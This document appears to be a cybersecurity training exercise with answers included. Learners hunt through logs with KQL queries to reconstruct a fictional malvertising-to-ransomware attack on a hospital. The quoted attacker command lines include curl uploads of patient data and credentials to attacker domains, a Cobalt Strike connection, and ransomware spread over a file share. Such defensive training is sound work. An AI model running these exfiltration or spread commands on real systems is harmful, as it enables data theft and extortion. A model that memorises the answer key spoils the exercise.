# Jojo’s Hospital: A Ransmoware Investigation

# Crypto - but the bad kind

### Question 1

JoJo's Hospital in Lexington, Kentucky, recently faced a serious cyberattack that locked their important files. The hackers sent a message to the hospital asking for money to unlock the files. They gave a specific amount of time to pay.

[https://youtu.be/06pzJRrtGAM](https://youtu.be/06pzJRrtGAM)

**How many hours did the hackers give the hospital to pay the ransom?**

> `72`
> 

### Question 2

The ransomware group left a bold name at the top of the note.

![](https://kc7photos-cfhbcabpaxb2f8fn.z03.azurefd.net/manualphotos/jojo_ransom_note_1.png)

**What was the name of the ransomware group?**

> `lock byte`
> 

### Question 3

**The slogan was: we spend your money, so ____**

> `you don't have to`
> 

### Question 4

Not only did the hackers ask the hospital for money, but they also sent scary emails to patients. They asked patients to pay money too, or their personal information would be shared.

**How much did the hackers ask the patients to pay?**

> **`10,000`**
> 

### Question 5

The lock byte ransom group threatened to release the hospital patients' health history, medical information and one other thing.

**What very important unique identifier number did the ransomware operators threaten to release?**

> **`ssn`**
> 

### Question 6

We can confirm that the hackers encrypted files on the machines of many employees. This means those employees could no longer access their important files. This is very bad!

We can find the locked files by looking for files that end with ".encrypted"

```sql
FileCreationEvents
| where filename endswith ".encrypted"
| count
```

**How many total files were encrypted at the hospital?**

> `6420`
> 

### Question 7

To properly scope our investigation, it would be helpful to know how many computers had their files locked up by the ransomware. This information will help us understand the extent of the problem and plan our next steps.

```sql
FileCreationEvents
| where filename endswith ".encrypted"
| distinct ____
```

**How many unique `hostname`s had files encrypted on them?**

> `321`
> 

```sql
FileCreationEvents
| where filename endswith ".encrypted"
| distinct hostname
| count 
```

### Question 8

The hackers left a note on at least one of the computers telling the hospital how to pay the ransom. This note had a specific name `We_Have_Your_Data_Pay_Up.txt`

```sql
FileCreationEvents
| where filename == "We_Have_Your_Data_Pay_Up.txt"
```

**What was the Sha256 hash of this ransom file?**

> `97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018`
> 

### Question 9

**What was the full path of this ransom file?**

> `C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt`
> 

### Question 10

**On how many hosts (machines) was this ransom file seen?**

```sql
FileCreationEvents
| where filename == "We_Have_Your_Data_Pay_Up.txt"
| count
```

> `1`
> 

### Question 11

This ransom note is a major clue! We can use it to figure out how the ransom might have happened.

**What hostname was the ransom note seen on?**

> `AMFB-MACHINE`
> 

### Question 12

Great, now that we know what hostname the file was seen on. We can figure out who it belongs to!

```sql
Employees
| where ____ == _____
```

**What is the name of the employee whose host has the ransom note?**

> `Anthony Davis`
> 

```sql
Employees
| where hostname == "AMFB-MACHINE"
```

### Question 13

Since the ransom note was only seen on Anthony's machine, it is likely that more bad stuff happened on this machine.

We can start by zooming into Anthony's machine to see what weird things occured in ProcessEvents around the time the company got ransomed.

ProcessEvents tell us what kinds of things happened on a computer.

```sql
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
```

**Run the query above. How many process events were executed on Anthony's machine during this time period?**

> `14`
> 

### Question 14

Let's read through the commands in the `process_commandline` column from the top down. Make sure you are sorting by time.

One of the command mentions a "ransomer". That's VERY suspicious!

**What was the name of the ransomer file mentioned?**

> `lockbyte_ransomer.exe`
> 

```sql
ProcessEvents
| where process_commandline contains "ransom"
```

### Question 15

The hackers put this "ransomer" file on a shared folder at the hospital called `\\jojos-hospital.org`. They did this to spread the ransomware quickly to many computers in the hospital. By putting the bad file on a shared drive, any computer that could access this drive might run the ransomware.

This way, the infection spreads faster and makes it harder for the hospital's IT team to stop the attack. The hackers used the hospital's sharing system to make the attack as big as possible.

**When the attackers copied the `ransomer` file to the network share, what new name did they give it?**

> `spread_ransomware.exe`
> 

```powershell
cmd.exe /c copy C:\\Users\\andavis\\Downloads\\lockbyte_ransomer.exe \\jojos-hospital.org\\shared\\spread_ransomware.exe
```

### Question 16

If we keep looking down in the data, we can see that the hackers actually stole some data from the hospital as well 😱

```sql
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
```

**What tool did the attackers use to steal the data? This will be a .exe file**

> `patient_data_exporter.exe`
> 

```sql
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
| where process_name == "cmd.exe"
| project-keep process_commandline
```

```sql
cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_1.zip https://secure-health-access.com/upload/patient_data_1.zip
```

### Question 17

We let the bosses know that the attackers actually stole some files. They were not at all thrilled to hear that. They want to know what the attackers actually stole.

The attackers stole files that they put into three zip files.

**What information did the attackers put into `patient_data_1.zip`? Provide the full path of the network share `\\something\like\this`**

> `\\jojos-hospital-server\important_data\patient_records`
> 

```sql
ProcessEvents
| where process_commandline contains "patient_data_1"
| project-keep process_commandline
```

```sql
C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_1.zip /source \\jojos-hospital-server\important_data\patient_records

cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_1.zip https://secure-health-access.com/upload/patient_data_1.zip
```

### Question 18

**What information did the attackers put into `patient_data_2.zip`? Provide the full path of the network share `\\something\like\this`**

> `\\jojos-hospital-server\important_data\archive\patient-records`
> 

```sql
ProcessEvents
| where process_commandline contains "patient_data_2"
| project-keep process_commandline
```

### Question 19

**What information did the attackers put into `patient_data_3.zip`? Provide the full path of the network share `\\something\like\this`**

> `\\jojos-hospital-server\important_data\old-patient-data`
> 

```sql
ProcessEvents
| where process_commandline contains "patient_data_3"
| project-keep process_commandline
```

### Question 20

After pulling down the important data they wanted to steal, the attackers sent it out the door using a curl command. A curl command is like a digital delivery service.

Imagine you're sending a package to a friend far away. You pack up the item, write the address on the box, and then hand it to the delivery person who takes it to your friend's house. Similarly, a curl command packs up the stolen data, addresses it to an external server, and sends it over the internet. This way, the attackers can quickly and quietly move the stolen data from the hospital’s computers to their own remote server.

**What domain (e.g. `abcd.com`) did the attackers send the stolen data to?**

> `secure-health-access.com`
> 

```sql
ProcessEvents
| where process_commandline contains "curl"
| project-keep process_commandline
```

### Question 21

Finally, like a thief in the night, the attackers deleted any trace of the stolen data.

![](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExb2NmZ2d5Z3hrYTA5cTJlcW1jMThjbWRxcXQ2dG5oNWVoOWIzOXhnMiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/5QMOICVmXremPSa0k7/giphy.webp)

**What command did they use to clear their tracks? Copy and paste the full command.**

> `cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip`
> 

```sql
ProcessEvents
| where process_commandline contains "del" and process_name == "cmd.exe"
| project-keep process_commandline
```

### Question 22

But wait a minute… `patient_data_exporter.exe` is not a file that is supposed to be used at the hospital. Where did it come from?

Perhaps it was downloaded.

```sql
OutboundNetworkEvents
| where url has "patient_data_exporter.exe"
```

**What domain was the patient data exporter file downloaded from?**

> `secure-health-access.com`
> 

### Question 23

**When was the patient data exporter file downloaded? (copy and paste the exact timestamp)**

> `2024-06-17T14:22:29Z`
> 

### Question 24

Okay, so we already know about one domain owned by the hacker. We can use this domain to find more websites or servers that the hacker controls.

```sql
PassiveDns
| where domain == "secure-health-access.com"
```

Remember, PassiveDNS data give us information about that domain to IP address associations.

**How many distinct IPs does the domain `secure-health-access.com` resolve to?**

> `2`
> 

### Question 25

**Which one of these IPs ends with the digit `1`?**

> `203.0.113.1`
> 

### Question 26

**Which one of these IPs ends with the digit `2`?**

> `203.0.113.2`
> 

### Question 27

Now's let's "pivot" on the new IP addresses that we found to see if any other domains are associated with them.

```sql
PassiveDns
| where ip in ("ip_address", "ip_address")
```

**What additional domain name is associated with these IP addresses?**

> `emr-help.net`
> 

```sql
PassiveDns
| where ip in ("203.0.113.1", "203.0.113.2")
| distinct domain
```

### Question 28

Nice! Now we have two IP addresses and two domain names owned by hackers.

Sometimes, hackers will go to our website and do research on the things they are interested in stealing. We call this reconnaissance.

![](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExaW1kbmUxZWprZ2w5NjY1M2o4aDdxMmdvcGN0eDR6NWlxczZnMTc3NiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Zvgb12U8GNjvq/giphy.webp)

Let's take the actor IPs we found and look for any reconnaissance they conducted against the hospital website. InboundNetworkEvents contains information about browsing to our website.

```sql
InboundNetworkEvents
| where src_ip  in ("ip_address", "ip_address")
```

**How many requests did the hackers make to our website from these IPs?**

```sql
InboundNetworkEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
| count
```

### Question 29

Wow looks like the threat actors really took their time to research the things they wanted to steal!

```sql
InboundNetworkEvents
| where src_ip  in ("ip_address", "ip_address")
| where url has "bypass"
```

**The hackers were curious about how to bypass ___ at Jojo's hospital.**

> `security`
> 

```sql
InboundNetworkEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
| where url has "bypass"
```

### Question 30

The hackers appears to have been really interested in patient information.

```sql
InboundNetworkEvents
| where src_ip  in ("ip_address", "ip_address")
| where url has "patient"
```

**What was the first web request the hackers made using the term `patient`? (hint: it was a search). Paste the full url.**

> `https://jojoshospital.org/search=JoJo%27s+Hospital+patient+records`
> 

```sql
InboundNetworkEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
| where url has "patient"
| project-keep url
```

### Question 31

Since we already have two IPs owned by the hackers, we can also check to see if they logged into anybody's account.

AuthenticationEvents show us all logins that happen on computers and servers at the company.

```sql
AuthenticationEvents
| where src_ip  in ("ip_address", "ip_address")
```

Looks like they logged into one account!

**When did this login occur?**

> `5/20/2024, 12:00:00 AM`
> 

### Question 32

**Which IP address did the actors use for the login?**

> `203.0.113.1`
> 

### Question 33

**Whose account did the hackers login to? (provide a first and last name)**

> `Anthony Davis`
> 

```sql
Employees
| where username == "andavis"
```

### Question 34

Oh wow! That must be why we saw the ransom note on Davis' computer. It looks like the hackers found a way to log into his computer. Once they got in, they downloaded the bad ransom file and spread it to other computers using a shared folder. This way, they were able to lock the files on everyone's computers in the company.

![falling dominos](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjZxdzRjdm9vM3VxbW1vbjFjMmFuZGl5dmdrMjAwYnkzbHN0anlzZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/HPA8CiJuvcVW0/giphy.webp)

![](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjZxdzRjdm9vM3VxbW1vbjFjMmFuZGl5dmdrMjAwYnkzbHN0anlzZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/HPA8CiJuvcVW0/giphy.webp)

**Enter `yikes` to finish with this section**

> `yikes`
> 

# Sharks in the hospital water

### Question 1

To get into the hospital's computer system, the hackers used stolen credentials. These were purchased from another hacker.

**Whose credentials did the hackers use to access the hospital's network? (Enter first and last name)**

> `Anthony Davis`
> 

### Question 2

Apparently these credentials were purchased on the dark web from another hacking group! But how exactly did this hacking group get access to Davis' credentials?

Let's investigate!

A few weeks back someone at the company reported seeing a sponsored google search result for Raising Cane's, the famous chicken place. This restaurant chain has a location across the street from Jojo's hospital and is popular among the hospital staff.

![](https://kc7photos-cfhbcabpaxb2f8fn.z03.azurefd.net/manualphotos/jojo_hospital_%20sponsored_ad.jpg)

(right click and open the image in a new tab)

**What was the domain name observed in the sponsored search result?**

> `raisinkanes.com`
> 

### Question 3

![](https://kc7photos-cfhbcabpaxb2f8fn.z03.azurefd.net/manualphotos/jojo_hospital_%20sponsored_ad.jpg)

(right click and open the image in a new tab)

**What is the legitimate domain for Raising Cane's?**

> `raisingcanes.com`
> 

### Question 4

The hospital staff may have been tricked into clicking on the fake advertisement. This ad looked very real.

Look in the OutboundNetworkEvents table.

**How many web requests do we see going to the fake raisinkanes domain?**

> `26`
> 

```sql
OutboundNetworkEvents
| where url contains "raisinkanes"
| count 
```

### Question 5

Some of those requests may have been made by the same people. This would happen if the same person click on the ad multiple times.

**How many unique employees were seen browsing to the fake raisinkanes domains? (hint distinct the src_ip)**

> `24`
> 

```sql
OutboundNetworkEvents
| where url contains "raisinkanes"
| distinct src_ip
```

### Question 6

When staff clicked on the fake advertisement, it took them to a harmful website. This website had a malicious URL.

**Which of the malicious domains used for redirection starts with the word "nothing"?**

> `nothing-to-see-here.net`
> 

```sql
OutboundNetworkEvents
| where url contains "nothing"
| project-keep url
```

```sql
https://raisinkanes.com?redirect=nothing-to-see-here.net
```

### Question 7

**Which of the malicious domains used for redirection starts with the word "totally"?**

> `totally-legit-domain.com`
> 

### Question 8

Now we must wonder what happens when the employees click on those suspicious domains and are redirected.

Looks like they are forced to download some suspicious files.

**What is the name of the docx file they are redirected to?**

> `Raisin_Kane_Promo_Offer.docx`
> 

```sql
OutboundNetworkEvents
| where url contains "totally" and url contains "docx"
| project-keep url
```

### Question 9

**What is the name of the pdf file they are redirected to?**

> `Raisin_Kane_Free_Meal_Voucher.pdf`
> 

### Question 10

After gaining access to the computers, the attackers dropped a specific malicious file to maintain control. This file helped them run further commands and do more damage.

We can find the malicious file that got dropped by focusing on just one victim

```sql
FileCreationEvents
| where filename == "Raisin_Kane_Promo_Offer.docx"
```

**What is the hostname of the first person to download the suspicious docx file?**

> `RQJQ-MACHINE`
> 

```sql
FileCreationEvents
| where filename == "Raisin_Kane_Promo_Offer.docx"
| sort by timestamp asc
```

### Question 11

**When did this download occur? (copy and paste the timestamp)**

> `5/1/2024, 9:56:50 AM`
> 

### Question 12

**What was the Sha256 hash of the file?**

> `bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712`
> 

### Question 13

**Which browser was used to download this file? (look at the process_name)**

> `chrome`
> 

### Question 14

If we take a closer look at files that get dropped on that victim host, we find that a malicious `.exe` file gets dropped immediately after the docx file is downloaded on the 1st of May.

```sql
FileCreationEvents
| where hostname == "RQJQ-MACHINE"

```

**What was the name of the malicious file dropped by the attackers?**

> `cobaltstrike.exe`
> 

```sql
FileCreationEvents
| where hostname == "RQJQ-MACHINE"
| where timestamp >= datetime(2024-05-01T09:56:50.000Z)
| project-keep filename
```

### Question 15

We can look at ProcessEvents to see what actually happened after the suspicious files were downloaded.

```sql
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where timestamp between (datetime(2024-05-01) .. datetime(2024-05-02))

```

**Which command (`process_commandline`) shows the execution of the `Raisin_Kane_Promo_Offer.docx` file? (copy and paste the whole command)**

> `"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx"`
> 

```sql
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where timestamp between (datetime(2024-05-01) .. datetime(2024-05-02))
| where process_commandline contains "docx"
```

### Question 16

Soon after the docx file is executed, we can see the threat actors using cobaltstrike to connect to an IP address.

**What IP address do the hackers connect to using cobalt strike?**

> `93.238.22.122`
> 

```sql
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where process_commandline contains "cobalt"

// C:\ProgramData\cobaltstrike.exe --connect 93.238.22.122:50050
```

### Question 17

**Over what port do the hackers connect to that IP address?**

> `50050`
> 

### Question 18

The next day, the attackers woke up and realized their malware had done more than expected and they now had access to the hospital's network. They began to manually issue "discovery" commands to gather information about the network.

These short commands helped them learn about the network's setup and devices.

```sql
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where timestamp between (datetime(2024-05-02) .. datetime(2024-05-04))
```

**What was the first discovery command issued by the hackers? (hint: it has to do with a system)**

> `systeminfo`
> 

```sql
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where process_name == "cmd.exe" and process_commandline contains "system"
```

```json
"timestamp": 2024-05-02T15:45:54.000Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": systeminfo,
"process_name": cmd.exe,
"process_hash": b77341d06fd3330f726634b10424f9687987845daf3c99917ab9db3c401b3699,
"hostname": RQJQ-MACHINE,
"username": evbrowne
```

### Question 19

**How many of these short discovery commands did the attackers run?**

> `6`
> 

```sql
ProcessEvents
| where timestamp > datetime(2024-05-02T15:45:54.000Z)
| where hostname == "RQJQ-MACHINE"
| where process_name == "cmd.exe"
| distinct process_commandline 
```

```powershell
ipconfig /all
netstat -an
net user
net localgroup administrators
net view
C:\Windows\System32\cmd.exe nslookup google.com
```

### Question 20

Hmmm… after this point, it looks like the attackers didn't do anything else. However, we know for sure they were super interested in Anthony Davis' account, so maybe they actually ran more commands over there.

Hint: Look in the Employees table

**What is Anthony Davis' hostname?**

```powershell
Employees
| where name == "Anthony Davis"
```

> `AMFB-MACHINE`
> 

### Question 21

**When did the attackers connect to their IP address using cobalt strike on Anthony Davis' machine?**

> `5/14/2024, 12:24:45 PM`
> 

```sql
ProcessEvents
| where timestamp > datetime(2024-05-02T15:45:54.000Z)
| where hostname == 'AMFB-MACHINE' and process_commandline contains "connect"
```

### Question 22

Once they got on Anthony Davis' machine, the hackers wanted to get a better understanding of the entire hospital network. So they downloaded an advanced scanning tool.

![](https://i.makeagif.com/media/10-01-2017/YGrO1T.gif)

```sql
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17))
```

> `advanced-ip-scanner.exe`
> 

```sql
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17))
| where process_commandline contains "scan"
```

### Question 23

To better understand the hospital's network, the attackers took files that showed the network layout. These files contained important diagrams.

**What was the name of the file the attackers exfiltrated to learn about the network? (hint: ___.pdf)**

> `network_diagrams.pdf`
> 

```sql
ProcessEvents
| where process_commandline endswith "pdf"

// cmd.exe /c copy C:\Users\andavis\Documents\network_diagrams.pdf \\jojos-hospital.org\backup\network_diagrams.pdf
```

### Question 24

**What was the name of the file the attackers took that would have contained usernames and passwords?**

> `credentials.txt`
> 

```sql
ProcessEvents
| where timestamp >= datetime(2024-05-16T11:25:08.000Z)
| where process_name == "cmd.exe" and process_commandline contains "copy"
```

### Question 25

Before stealing this file, the attackers first compressed them into a zip file. This allowed the files to be smaller so they would attract less attention.

**What was the name of this zip file?**

> `important_network_info.zip`
> 

```sql
ProcessEvents
| where timestamp >= datetime(2024-05-16T11:25:08.000Z)
| where process_name == "cmd.exe" and process_commandline contains "zip"

// cmd.exe /c powershell Compress-Archive -Path C:\Users\andavis\Documents\network_diagrams.pdf, C:\Users\andavis\Documents\credentials.txt -DestinationPath C:\Users\andavis\Desktop\important_network_info.zip
```

### Question 26

The attackers once again used a `curl` command to upload the compressed zip file to a known attacker domain name.

**Which domain did the attackers send the zip to?**

> `nothing-to-see-here.net`
> 

```sql
// cmd.exe /c curl -F "file=@C:\Users\andavis\Desktop\important_network_info.zip" https://nothing-to-see-here.net/upload
```

### Question 27

You just investigated a two-stage attack on JoJo's Hospital in Lexington, Kentucky.

First, `SharkFin7` used a fake advertisement to trick hospital employees into downloading a malicious file. Once inside the network, they moved laterally, stole sensitive data, and then sold their access to the LockByte ransomware group. `LockByte` used that foothold to encrypt critical hospital files and extort the hospital and its patients.

Along the way, you practiced tracing an attack from initial access through to impact, pivoting across tables to follow the trail. You saw how access brokers and ransomware operators work together, and why organizations like hospitals are high-value targets.

Nice work, analyst. 🎉

**You did an amazing job! Enter `yay` to finish**

> `yay`
>